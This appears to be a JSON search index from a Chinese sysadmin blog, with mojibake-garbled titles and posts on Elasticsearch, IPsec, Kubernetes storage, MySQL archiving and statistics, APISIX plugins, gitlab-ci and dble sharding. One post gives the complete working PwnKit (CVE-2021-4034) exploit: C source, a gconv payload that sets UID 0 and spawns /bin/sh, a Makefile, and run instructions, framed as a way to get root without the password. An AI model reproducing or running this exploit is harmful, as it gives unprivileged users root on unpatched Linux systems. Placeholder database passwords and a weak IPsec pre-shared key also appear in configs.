/_cluster/settings { \"transient\" : { \"indices.lifecycle.poll_interval\" : null } } ","date":"2022-07-07 21:28","objectID":"/post/2858/:0:6","tags":["elasticsearch"],"title":"ElasticSearch ILMç´¢å¼•ç”Ÿå‘½å‘¨æœŸå®è·µ - æ—¥å¿—åœºæ™¯","uri":"/post/2858/"},{"categories":["å…¶ä»–"],"content":"https://www.tecmint.com/setup-ipsec-vpn-with-strongswan-on-debian-ubuntu/ yum install -y strongswan ä¿®æ”¹/etc/strongswan/ipsec.conf left conn atou left=172.30.1.140 leftsubnet=172.30.0.1/23 right=å¯¹ç«¯å…¬ç½‘ip rightsubnet=10.23.40.0/24 leftid=ali rightid=ucloud esp=3des-sha type=tunnel leftauth=psk rightauth=psk keyexchange=ikev2 auto=start right conn utoa left=10.23.40.38 leftsubnet=10.23.40.0/24 right=å¯¹ç«¯å…¬ç½‘ip rightsubnet=172.30.0.1/23 leftid=ucloud rightid=ali esp=3des-sha type=tunnel leftauth=psk rightauth=psk keyexchange=ikev2 auto=start /etc/strongswan/ipsec.secrets ucloud ali : PSK \"123@123\" ","date":"2022-07-04 10:03","objectID":"/post/2855/:0:0","tags":[],"title":"ä½¿ç”¨strongswanæ­å»ºipsecéš§é“","uri":"/post/2855/"},{"categories":["kubernetes"],"content":"ä¸»è¦æ˜¯å¤‡å¿˜,å‰æè¦æœ‰alicloud-nas-controller apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: alicloud-nas-devops mountOptions: - nolock,tcp,noresvport - vers=4 parameters: server: xxx.xxx.nas.aliyuncs.com:/ volumeAs: subpath archiveOnDelete: \"true\" provisioner: alicloud/nas reclaimPolicy: Delete volumeBindingMode: Immediate pvcæµ‹è¯• apiVersion: v1 kind: PersistentVolumeClaim metadata: labels: app: test name: test spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi storageClassName: alicloud-nas-devops volumeMode: Filesystem ","date":"2022-06-27 18:53","objectID":"/post/2854/:0:0","tags":[],"title":"é…ç½®ackçš„nas storageclass","uri":"/post/2854/"},{"categories":["ç›‘æ§"],"content":"é¡¹ç›®: https://github.com/utkuozdemir/nvidia_gpu_exporter wget https://github.com/utkuozdemir/nvidia_gpu_exporter/releases/download/v0.3.0/nvidia_gpu_exporter_0.3.0_linux_x86_64.tar.gz tar xf nvidia_gpu_exporter_0.3.0_linux_x86_64.tar.gz nohup ./nvidia_gpu_exporter \u0026 52854-g5jcf6ww2zs.png grafanaç›¸å¯¹äºåŸä½œçš„å¢åŠ äº†Instanceç»´åº¦ { \"annotations\": { \"list\": [ { \"builtIn\": 1, \"datasource\": \"-- Grafana --\", \"enable\": true, \"hide\": true, \"iconColor\": \"rgba(0, 211, 255, 1)\", \"name\": \"Annotations \u0026 Alerts\", \"target\": { \"limit\": 100, \"matchAny\": false, \"tags\": [], \"type\": \"dashboard\" }, \"type\": \"dashboard\" } ] }, \"description\": \"Nvidia GPU Metrics based on the prometheus metrics from github.com/utkuozdemir/nvidia_gpu_exporter\", \"editable\": true, \"fiscalYearStartMonth\": 0, \"gnetId\": 14574, \"graphTooltip\": 0, \"id\": 537, \"iteration\": 1656057019477, \"links\": [], \"liveNow\": false, \"panels\": [ { \"datasource\": \"prometheus\", \"description\": \"The official product name of the GPU. This is an alphanumeric string. For all products.\", \"fieldConfig\": { \"defaults\": { \"color\": { \"mode\": \"thresholds\" }, \"decimals\": 2, \"mappings\": [], \"thresholds\": { \"mode\": \"absolute\", \"steps\": [ { \"color\": \"green\", \"value\": null } ] }, \"unit\": \"none\" }, \"overrides\": [] }, \"gridPos\": { \"h\": 3, \"w\": 4, \"x\": 0, \"y\": 0 }, \"id\": 23, \"options\": { \"colorMode\": \"value\", \"graphMode\": \"none\", \"justifyMode\": \"auto\", \"orientation\": \"auto\", \"reduceOptions\": { \"calcs\": [ \"last\" ], \"fields\": \"\", \"values\": false }, \"text\": {}, \"textMode\": \"name\" }, \"pluginVersion\": \"8.2.2\", \"targets\": [ { \"exemplar\": true, \"expr\": \"nvidia_smi_gpu_info{uuid=\\\"$gpu\\\"}\", \"instant\": true, \"interval\": \"\", \"legendFormat\": \"{{name}}\", \"refId\": \"A\" } ], \"timeFrom\": null, \"timeShift\": null, \"title\": \"Name\", \"type\": \"stat\" }, { \"datasource\": \"prometheus\", \"description\": \"The current performance state for the GPU. States range from P0 (maximum performance) to P12 (minimum performance).\", \"fieldConfig\": { \"defaults\": { \"color\": { \"mode\": \"thresholds\" }, \"decimals\": 0, \"mappings\": [ { \"options\": { \"\": { \"text\": \"\" } }, \"type\": \"value\" } ], \"thresholds\": { \"mode\": \"absolute\", \"steps\": [ { \"color\": \"green\", \"value\": null } ] }, \"unit\": \"prefix:P\" }, \"overrides\": [] }, \"gridPos\": { \"h\": 3, \"w\": 2, \"x\": 4, \"y\": 0 }, \"id\": 22, \"options\": { \"colorMode\": \"value\", \"graphMode\": \"none\", \"justifyMode\": \"auto\", \"orientation\": \"auto\", \"reduceOptions\": { \"calcs\": [ \"last\" ], \"fields\": \"\", \"values\": false }, \"text\": {}, \"textMode\": \"value\" }, \"pluginVersion\": \"8.2.2\", \"targets\": [ { \"exemplar\": true, \"expr\": \"nvidia_smi_pstate{uuid=\\\"$gpu\\\"}\", \"interval\": \"\", \"legendFormat\": \"\", \"refId\": \"A\" } ], \"timeFrom\": null, \"timeShift\": null, \"title\": \"P-State\", \"type\": \"stat\" }, { \"datasource\": \"prometheus\", \"description\": \"Percent of time over the past sample period during which one or more kernels was executing on the GPU.\\nThe sample period may be between 1 second and 1/6 second depending on the product.\", \"fieldConfig\": { \"defaults\": { \"color\": { \"mode\": \"thresholds\" }, \"mappings\": [], \"max\": 1, \"min\": 0, \"thresholds\": { \"mode\": \"percentage\", \"steps\": [ { \"color\": \"green\", \"value\": null }, { \"color\": \"#EAB839\", \"value\": 70 }, { \"color\": \"red\", \"value\": 90 } ] }, \"unit\": \"percentunit\" }, \"overrides\": [] }, \"gridPos\": { \"h\": 5, \"w\": 3, \"x\": 6, \"y\": 0 }, \"id\": 6, \"options\": { \"orientation\": \"auto\", \"reduceOptions\": { \"calcs\": [ \"last\" ], \"fields\": \"\", \"values\": false }, \"showThresholdLabels\": false, \"showThresholdMarkers\": true, \"text\": {} }, \"pluginVersion\": \"8.2.2\", \"targets\": [ { \"exemplar\": true, \"expr\": \"nvidia_smi_utilization_gpu_ratio{uuid=\\\"$gpu\\\"}\", \"interval\": \"\", \"legendFormat\": \"{{uuid}}\", \"refId\": \"A\" } ], \"title\": \"GPU Utilization %\", \"transformations\": [], \"type\": \"gauge\" }, { \"datasource\": \"prometheus\", \"description\": \"The last measured power draw for the entire board, in watts. Only available if power management is supported. This reading is accurate to within +/- 5 watts / The software power limit in watts.\", \"fieldConfig\": { \"default","date":"2022-06-24 16:13","objectID":"/post/2850/:0:0","tags":[],"title":"nvidia_gpu_exporteréƒ¨ç½²","uri":"/post/2850/"},{"categories":["å…¶ä»–"],"content":"æ•°æ®å½’æ¡£ #!/bin/bash # å°†table1è¡¨åˆ°å½’æ¡£åº“ LAST_TIME=$(date -d -365day \"+%s\") echo ${LAST_TIME} /usr/bin/pt-archiver \\ --source h=1.1.1.1,u=root,p=123456,P=3306,D=db1,t=table1 \\ --dest h=2.2.2.2,u=root,p=123456,P=3306,D=archive_db1,t=table1 \\ --progress 5000 --where 'date \u003c '${LAST_TIME}' ' \\ --charset=UTF8 --limit=1000 --txn-size 1000 \\ --replace --statistics --bulk-delete | tee /tmp/archive.log ","date":"2022-06-19 11:51","objectID":"/post/2848/:0:1","tags":[],"title":"mysql pt-archiveæ•°æ®å½’æ¡£","uri":"/post/2848/"},{"categories":["å…¶ä»–"],"content":"æ•°æ®æ¸…ç† #!/bin/bash # åˆ é™¤å½’æ¡£åº“é‡Œçš„table1æ•°æ® source /etc/profile END_TIME=$(date -d \"2018-12-31 23:59:59\" +%s) DBUSER=\"root\" DBPASS=\"123456\" DBADDR=\"1.1.1.1\" function purge(){ echo \"åˆ é™¤table1 $(date +'%Y-%m-%d %H:%M:%S' -d @$END_TIME) ä¹‹å‰çš„æ•°æ®\" /usr/bin/pt-archiver \\ --source h=${DBADDR},u=${DBUSER},p=${DBPASS},P=3306,D=archive_db1,t=table1 \\ --no-check-charset \\ --where \"adlog_date \u003c= '${END_TIME}' \" \\ --limit 1000 --txn-size 1000 --statistics --skip-foreign-key-checks \\ --purge --progress 1000 --statistics | tee /tmp/delete_archive.log } purge ","date":"2022-06-19 11:51","objectID":"/post/2848/:0:2","tags":[],"title":"mysql pt-archiveæ•°æ®å½’æ¡£","uri":"/post/2848/"},{"categories":["databases"],"content":"åŸåˆ›:æˆ‘çš„äºŒç‹—å‘¢ https://blog.51cto.com/lee90 ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:0","tags":["mysql"],"title":"mysqlå¸¸ç”¨ç»Ÿè®¡sql","uri":"/post/2847/"},{"categories":["databases"],"content":"è¡¨ä½“ç§¯ SELECT curdate() AS INSERT_DATE , CONCAT(table_schema, '.', table_name) AS TB_NAME, table_rows AS ROWS, ROUND(data_length /1024/1024/1024,2) AS DATA_GB, ROUND(index_length /1024/1024/1024,2)AS idx_GB, ROUND((data_length + index_length)/1024/1024/1024 , 2) AS total_size_GB, index_length / data_length AS idxfrac, ROUND((data_length+index_length)/@total_size/1024,2) as pct FROM information_schema.TABLES where table_schema NOT IN ('mysql','test','information_schema','heartbeat','performance_schema') ORDER BY ( data_length + index_length ) DESC LIMIT 10 ; ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:1","tags":["mysql"],"title":"mysqlå¸¸ç”¨ç»Ÿè®¡sql","uri":"/post/2847/"},{"categories":["databases"],"content":"è¡¨è‡ªå¢ä¸»é”®ä½¿ç”¨æƒ…å†µ select curdate() AS INSERT_DATE , table_schema, table_name, column_name, AUTO_INCREMENT, POW(2, CASE data_type WHEN 'tinyint' THEN 7 WHEN 'smallint' THEN 15 WHEN 'mediumint' THEN 23 WHEN 'int' THEN 31 WHEN 'bigint' THEN 63 END+(column_type LIKE '% unsigned'))-1 AS max_int FROM information_schema.tables t JOIN information_schema.columns c USING (table_schema,table_name) WHERE c.extra = 'auto_increment' AND t.TABLE_SCHEMA NOT IN ('information_schema','mysql', 'sys','test','performance_schema') AND t.auto_increment IS NOT NULL ; \" ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:2","tags":["mysql"],"title":"mysqlå¸¸ç”¨ç»Ÿè®¡sql","uri":"/post/2847/"},{"categories":["databases"],"content":"è¡¨ç¢ç‰‡ç‡top 10 select curdate() AS INSERT_DATE , ENGINE, CONCAT(TABLE_SCHEMA, '.', TABLE_NAME) AS TB_NAME, ROUND(DATA_LENGTH / 1024 / 1024) AS data_length_MB, ROUND(INDEX_LENGTH / 1024 / 1024) AS index_length_MB, ROUND(DATA_FREE / 1024 / 1024) AS data_free_MB, DATA_FREE / (DATA_LENGTH + INDEX_LENGTH) AS ratio_of_fragmentation FROM information_schema.tables WHERE DATA_FREE \u003e 0 AND TABLE_SCHEMA NOT IN ('mysql','test','performance_schema','information_schema','sys') ORDER BY ratio_of_fragmentation DESC LIMIT 10 ; ","date":"2022-06-19 10:43","objectID":"/post/2847/:0:3","tags":["mysql"],"title":"mysqlå¸¸ç”¨ç»Ÿè®¡sql","uri":"/post/2847/"},{"categories":["databases"],"content":"ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å›æ”¶è¡¨ç©ºé—´ï¼Œå‰©ä½™çš„ç£ç›˜ç©ºé—´æœ€å¥½å¤§äºç­‰äº50% ALTER table xxxx ENGINE=TokuDB ; æŸ¥çœ‹è¡¨ç©ºé—´ä½¿ç”¨æƒ…å†µ select dictionary_name, bt_size_allocated/1024/1024/1024 as 'å·²åˆ†é…å¤§å°(GB)', bt_size_in_use/1024/1024/1024 AS 'å·²ä½¿ç”¨å¤§å°(GB)' from information_schema.TokuDB_fractal_tree_info order by bt_size_allocated asc; ","date":"2022-06-19 10:30","objectID":"/post/2846/:0:0","tags":["mysql"],"title":"tokudb è¡¨ç©ºé—´å›æ”¶","uri":"/post/2846/"},{"categories":["å…¶ä»–"],"content":"åªæœ‰æ™®é€šç”¨æˆ·ï¼Œå¿˜è®°äº†rootå¯†ç æ€ä¹ˆåŠ? è¯•è¯•è¿™ä¸ªæ–¹å¼ææƒå§! github: https://github.com/berdav/CVE-2021-4034 ","date":"2022-06-17 14:40","objectID":"/post/2844/:0:0","tags":[],"title":"CVE-2021-4034 æ™®é€šç”¨æˆ·ææƒROOT SHELLæ¼æ´","uri":"/post/2844/"},{"categories":["å…¶ä»–"],"content":"ç¦»çº¿æ‰§è¡Œ,ä»£ç å¦‚ä¸‹ cve-2021-4034.c #include \u003cunistd.h\u003e int main(int argc, char **argv) { char * const args[] = { NULL }; char * const environ[] = { \"pwnkit.so:.\", \"PATH=GCONV_PATH=.\", \"SHELL=/lol/i/do/not/exists\", \"CHARSET=PWNKIT\", \"GIO_USE_VFS=\", NULL }; return execve(\"/usr/bin/pkexec\", args, environ); } pwnkit.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void gconv(void) { } void gconv_init(void *step) { char * const args[] = { \"/bin/sh\", NULL }; char * const environ[] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin\", NULL }; setuid(0); setgid(0); execve(args[0], args, environ); exit(0); } Makefile CFLAGS=-Wall TRUE=$(shell which true) .PHONY: all all: pwnkit.so cve-2021-4034 gconv-modules gconvpath .PHONY: clean clean: rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./ make -C dry-run clean gconv-modules: echo \"module UTF-8// PWNKIT// pwnkit 1\" \u003e $@ .PHONY: gconvpath gconvpath: mkdir -p GCONV_PATH=. cp -f $(TRUE) GCONV_PATH=./pwnkit.so:. pwnkit.so: pwnkit.c $(CC) $(CFLAGS) --shared -fPIC -o $@ $\u003c .PHONY: dry-run dry-run: make -C dry-run ","date":"2022-06-17 14:40","objectID":"/post/2844/:0:1","tags":[],"title":"CVE-2021-4034 æ™®é€šç”¨æˆ·ææƒROOT SHELLæ¼æ´","uri":"/post/2844/"},{"categories":["å…¶ä»–"],"content":"æ‰§è¡Œmakeç¼–è¯‘,æ‰§è¡Œ./cve-2021-4034ææƒ","date":"2022-06-17 14:40","objectID":"/post/2844/:0:2","tags":[],"title":"CVE-2021-4034 æ™®é€šç”¨æˆ·ææƒROOT SHELLæ¼æ´","uri":"/post/2844/"},{"categories":["äº‘åŸç”Ÿ"],"content":"å‡†å¤‡ git clone https://github.com/apache/apisix-docker.git cd apisix-docker/example ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:1","tags":["lua","openresty","apisix"],"title":"Apisix luaæ’ä»¶å¼€å‘æµç¨‹(docker-composeéƒ¨ç½²)","uri":"/post/2840/"},{"categories":["äº‘åŸç”Ÿ"],"content":"ä¸€ã€å¼€å¯control api vim apisix_conf/config.yaml enable_control: true control: ip: \"127.0.0.1\" port: 9090 ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:2","tags":["lua","openresty","apisix"],"title":"Apisix luaæ’ä»¶å¼€å‘æµç¨‹(docker-composeéƒ¨ç½²)","uri":"/post/2840/"},{"categories":["äº‘åŸç”Ÿ"],"content":"äºŒã€å¯åŠ¨apisix docker-compose -p docker-apisix up -d ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:3","tags":["lua","openresty","apisix"],"title":"Apisix luaæ’ä»¶å¼€å‘æµç¨‹(docker-composeéƒ¨ç½²)","uri":"/post/2840/"},{"categories":["äº‘åŸç”Ÿ"],"content":"ä¸‰ã€æ–°å¢æ’ä»¶è„šæœ¬ # è¿›å…¥å®¹å™¨ç¼–è¾‘æ–‡ä»¶ docker exec -it docker-apisix_apisix_1 vim /usr/local/apisix/apisix/plugins/my-plugin.lua è„šæœ¬å†…å®¹ local plugin_name = \"my-plugin\" local schema = { type = \"object\", properties = { content = { type = \"string\" } } } local _M = { version = 0.2, priority = 5001, name = plugin_name, schema = schema, } return _M å°†è‡ªå®šä¹‰çš„æ’ä»¶æ”¾åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚ vim /usr/local/apisix/conf/config-default.yaml plugins: - my-plugin ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:4","tags":["lua","openresty","apisix"],"title":"Apisix luaæ’ä»¶å¼€å‘æµç¨‹(docker-composeéƒ¨ç½²)","uri":"/post/2840/"},{"categories":["äº‘åŸç”Ÿ"],"content":"å››ã€é…ç½®dashboardå¯è§ è‡ªå®šä¹‰æ’ä»¶åï¼Œéœ€æ›´æ–°apisix dashboardçš„schema.json # é‡å¯apisix(ä¸é‡å¯ä¸çŸ¥é“è¡Œä¸è¡Œ,å¾…æµ‹è¯•) docker restart docker-apisix_apisix_1 # å¯¼å‡ºschema.json docker exec -it docker-apisix_apisix_1 curl 127.0.0.1:9090/v1/schema \u003e schema.json # å°†schema.jsonå¤åˆ¶åˆ°dashboardå®¹å™¨ä¸­ docker cp schema.json docker-apisix_apisix-dashboard_1:/usr/local/apisix-dashboard/conf/ # é‡å¯dashboard docker restart docker-apisix_apisix-dashboard_1 æ•ˆæœ: 54733-jb4zvaxvwl.png ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:5","tags":["lua","openresty","apisix"],"title":"Apisix luaæ’ä»¶å¼€å‘æµç¨‹(docker-composeéƒ¨ç½²)","uri":"/post/2840/"},{"categories":["ç³»ç»ŸæœåŠ¡","docker","äº‘åŸç”Ÿ"],"content":"é—®é¢˜æè¿°: å½“æäº¤ä»£ç è§¦å‘gitlab pipelineæ—¶ï¼Œæ‰§è¡Œåˆ°buildé˜¶æ®µçš„docker pushæ—¶ï¼Œæç¤º denied: access forbiddenï¼Œå‰é¢ä¹Ÿæç¤ºç™»å½•æˆåŠŸäº†ï¼Œå¾ˆå¥‡æ€ªï¼Œæœ€è¿‘å¹¶æ²¡æœ‰ä¿®æ”¹gitlab-ciæ–‡ä»¶ï¼Œä¹‹å‰è¿è¡Œä¹Ÿä¸€ç›´æ²¡é—®é¢˜ï¼Œå¹¶ä¸”å…¶ä»–pipelineè¿˜å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œæ‰€ä»¥åªèƒ½ä»cié…ç½®ä¸Šæ‰¾é—®é¢˜äº†ã€‚ cié…ç½®å¤§è‡´å¦‚ä¸‹: image: registry.gitlab.xxx.cn/base-images/maven variables: IMAGE_REF: $CI_REGISTRY_IMAGE:$CI_PIPELINE_ID stages: - build build: stage: build script: - export MAVEN_OPTS=-Dmaven.repo.local=$PWD/.m2/repository - mvn $MAVEN_CLI_OPTS clean package - mvn -U package - docker login -u gitlab-ci-token -p $CI_BUILD_TOKEN $ - docker build -t $IMAGE_REF . - docker push $IMAGE_REF - docker rmi $IMAGE_REF cache: paths: - .m2 å¯ä»¥çœ‹åˆ°buildæ˜¯ä½¿ç”¨äº†ä¸€ä¸ªå…¬å…±çš„åŸºç¡€é•œåƒï¼Œæ‰§è¡Œçš„å†…å®¹å°±æ˜¯ç¼–è¯‘æ‰“åŒ…åˆ¶ä½œé•œåƒä¸Šä¼  ","date":"2022-05-12 18:45","objectID":"/post/2833/:0:1","tags":["devops"],"title":"gitlab-ci ä¸Šä¼ é•œåƒæç¤ºdenied: access forbidden","uri":"/post/2833/"},{"categories":["ç³»ç»ŸæœåŠ¡","docker","äº‘åŸç”Ÿ"],"content":"æ’æŸ¥ ç•¥ ","date":"2022-05-12 18:45","objectID":"/post/2833/:0:2","tags":["devops"],"title":"gitlab-ci ä¸Šä¼ é•œåƒæç¤ºdenied: access forbidden","uri":"/post/2833/"},{"categories":["ç³»ç»ŸæœåŠ¡","docker","äº‘åŸç”Ÿ"],"content":"åŸå›  é—®é¢˜æ¯”è¾ƒå‘ï¼Œå¾ˆä¹…ä¹‹å‰å› ä¸ºæŸäº›åŸå› (å¿˜è®°äº†)å‡çº§äº†runneræ‰€åœ¨å®¿ä¸»æœºçš„dockerç‰ˆæœ¬åˆ°20.10.12ï¼Œä¹‹å‰åº”è¯¥æ˜¯1.13ã€‚ä½†æ˜¯åŸºç¡€é•œåƒä¸­ä½¿ç”¨çš„dockerå®¢æˆ·ç«¯ç‰ˆæœ¬è¿˜æ˜¯1.13çš„ï¼Œæ‰€ä»¥å°±å¯¼è‡´å“ªæ€•æç¤ºç™»é™†æˆåŠŸï¼Œä½†æ˜¯ä¾ç„¶ä¸èƒ½ä¸Šä¼ é•œåƒã€‚ ","date":"2022-05-12 18:45","objectID":"/post/2833/:0:3","tags":["devops"],"title":"gitlab-ci ä¸Šä¼ é•œåƒæç¤ºdenied: access forbidden","uri":"/post/2833/"},{"categories":["ç³»ç»ŸæœåŠ¡","docker","äº‘åŸç”Ÿ"],"content":"è§£å†³ æ–¹æ³•ä¸€ã€ å°†mavenå’Œdockerå‰¥ç¦»å¼€,dockerä½¿ç”¨æ–°çš„stageï¼Œå¹¶ä¸”å•ç‹¬ä½¿ç”¨æ–°ç‰ˆæœ¬çš„dockerå®¢æˆ·ç«¯image,è¿™æ ·çš„å¥½å¤„å°±æ˜¯ä¸ç”¨ä¿®æ”¹åŸºç¡€é•œåƒäº†ã€‚ æ–¹æ³•äºŒã€ å‡çº§åŸºç¡€é•œåƒä¸­çš„dockerç‰ˆæœ¬","date":"2022-05-12 18:45","objectID":"/post/2833/:0:4","tags":["devops"],"title":"gitlab-ci ä¸Šä¼ é•œåƒæç¤ºdenied: access forbidden","uri":"/post/2833/"},{"categories":["databases"],"content":"å®˜æ–¹æ–‡æ¡£: https://actiontech.github.io/dble-docs-cn ","date":"2022-05-04 22:12","objectID":"/post/2829/:0:0","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"æ‹†åˆ†ç±»å‹ ","date":"2022-05-04 22:12","objectID":"/post/2829/:1:0","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"å‚ç›´æ‹†åˆ† ä¸åŒçš„è¡¨æ”¾åˆ°ä¸åŒçš„åº“ä¸­ table_a -\u003e mysql1 table_b -\u003e mysql2 table_c -\u003e mysql3 ","date":"2022-05-04 22:12","objectID":"/post/2829/:1:1","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"æ°´å¹³æ‹†åˆ† ç›¸åŒçš„è¡¨æ”¾åˆ°ä¸åŒçš„åº“ä¸­,ä½†éœ€è¦æ˜ç¡®æ‹†åˆ†è§„åˆ™ï¼Œæ¯”å¦‚æŒ‰ç…§idå¤§å°æ‹†åˆ†åˆ°ä¸åŒçš„åº“ä¸­ã€‚ table_a -\u003e mysql1 table_a -\u003e mysql2 table_a -\u003e mysql3 ","date":"2022-05-04 22:12","objectID":"/post/2829/:1:2","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"dbleæ‰§è¡Œæ¶æ„ Application -\u003e dbleæ¥æ”¶è¯·æ±‚ -\u003e ç®€å•æŸ¥è¯¢ -\u003e ç›´æ¥æŸ¥è¯¢è¿”å›ç»“æœ | å¤æ‚æŸ¥è¯¢ | æ‰§è¡ŒæŸ¥è¯¢ | ä»£ç å±‚å¤„ç†joinã€groupã€orderç­‰æ“ä½œ | è¿”å›ç»“æœ ","date":"2022-05-04 22:12","objectID":"/post/2829/:2:0","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"é‡æ–°åŠ è½½é…ç½® restart reload: é‡æ–°è·å–åˆ†ç‰‡ä»¥åŠç”¨æˆ·æƒé™ä¸¤ä¸ªéƒ¨åˆ† reload all: åœ¨reloadçš„åŸºç¡€ä¸Šé‡å¯è·å–mysqlè¿æ¥ä¿¡æ¯å¹¶é‡å»ºè¿æ¥æ± ã€‚æ¯”è¾ƒå¸¸ç”¨ ","date":"2022-05-04 22:12","objectID":"/post/2829/:2:1","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"åˆ†ç‰‡è¡¨ç±»å‹ ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:0","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"åˆ†ç‰‡è¡¨ æ•°æ®æ ¹æ®æ°´å¹³æ‹†åˆ†çš„è¡¨ã€‚æ¯”å¦‚adè¡¨æ•°æ®é‡å¤ªå¤§ï¼Œéœ€è¦åˆ†åˆ°ä¸åŒçš„mysqlèŠ‚ç‚¹ä¸­ã€‚ ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:1","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"åˆ†ç‰‡å­è¡¨ é™„å±äºæŸåˆ†ç‰‡è¡¨çš„å­è¡¨ï¼Œå’Œçˆ¶è¡¨ä»¥åŒæ ·çš„è§„åˆ™è¿›è¡Œæ°´å¹³æ‹†åˆ†çš„è¡¨ã€‚ æ¯”å¦‚: customer(åˆ†ç‰‡è¡¨) æŒ‰ç…§idåˆ†ç‰‡ï¼Œå‡åŒ€çš„åˆ†é…åˆ°æ¯ä¸ªmysqlèŠ‚ç‚¹ä¸Š order(åˆ†ç‰‡å­è¡¨) åŒ…å«customer idï¼Œä¸ºäº†ä¸šåŠ¡æ–¹ä¾¿ï¼ŒæœŸæœ›ç”¨æˆ·å’Œè®¢å•éƒ½å­˜åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸­, æ¯”å¦‚id=1çš„ç”¨æˆ·çš„æ•°æ®åˆ†é…åˆ°mysql2ä¸­ï¼Œé‚£ä¹ˆä¸ä»–ç›¸å…³è”çš„è®¢å•æ•°æ®ä¹Ÿè¦åˆ†é…åˆ°mysql2ä¸­ ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:2","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"å…¨å±€è¡¨ åœ¨æ¯ä¸ªmysqlèŠ‚ç‚¹ä¸­éƒ½æ‹¥æœ‰ä¸€ä»½å…¨é‡çš„æ•°æ®ï¼Œæ¯”å¦‚å­—å…¸æ•°æ®å¯ä»¥ç”¨åˆ°å…¨å±€è¡¨ã€‚ ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:3","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"éåˆ†ç‰‡è¡¨ ä¸åˆ†ç‰‡ï¼Œå‚ç›´åˆ†ç‰‡è¡¨ï¼Œåªåœ¨å…¶ä¸­ä¸€ä¸ªmysqlèŠ‚ç‚¹ä¸­å­˜å‚¨ï¼Œæ¯”å¦‚æ—¥å¿—è¡¨ ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:4","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"å¦‚ä½•åˆ†ç‰‡ ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:0","tags":["mysql","dble"],"title":"dbleå­¦ä¹ -åŸºæœ¬é…ç½®å’Œæ¦‚å¿µ(ä¸€)","uri":"/post/2829/"},{"categories":["databases"],"content":"schema.xml å®šä¹‰å…·ä½“çš„tableè¦å­˜æ”¾åˆ°å“ªä¸ªmysqlèŠ‚ç‚¹ä¸­çš„å“ªä¸ªdatabaseä¸­ï¼ŒåŒ…æ‹¬mysqlè¿æ¥ä¿¡æ¯ï¼Œç”¨æˆ·ã€å¯†ç ã€ipã€ç«¯å£ä»¥åŠå­˜æ”¾æ•°æ®çš„databaseã€‚ ** é…ç½®è¯­æ³•æ ¼å¼ ** schemaéƒ¨åˆ† \u003cschema name=\"TESTDB\"\u003e \u003c!-- è™šæ‹Ÿåº“åç§° --\u003e \u003c!-- å®šä¹‰çš„æ˜¯åˆ†ç‰‡è¡¨ç±»å‹ã€‚åˆ†åˆ«å¯¹åº”è¡¨åï¼Œåˆ†ç‰‡è¡¨å¯ä»¥å­˜åˆ°å“ªäº›èŠ‚ç‚¹ã€åˆ†ç‰‡è§„åˆ™åç§° --\u003e \u003ctable name=\"travelrecord\" dataNode=\"dn1,dn2\" rule=\"sharding-by-hash2\" /\u003e \u003c!-- å®šä¹‰çš„æ˜¯å…¨å±€è¡¨ç±»å‹ã€‚åˆ†åˆ«å¯¹åº”è¡¨åã€ä¸»é”®åˆ—ã€ç±»å‹æ˜¯å…¨å±€è¡¨ã€å…¨å±€è¡¨å¯ä»¥å­˜åˆ°å“ªäº›èŠ‚ç‚¹ã€è‡ªå¢å±æ€§--\u003e \u003ctable name=\"company\" primaryKey=\"ID\" type=\"global\" dataNode=\"dn1,dn2,dn3,dn4\" autoIncrement=\"true\" /\u003e \u003c!-- 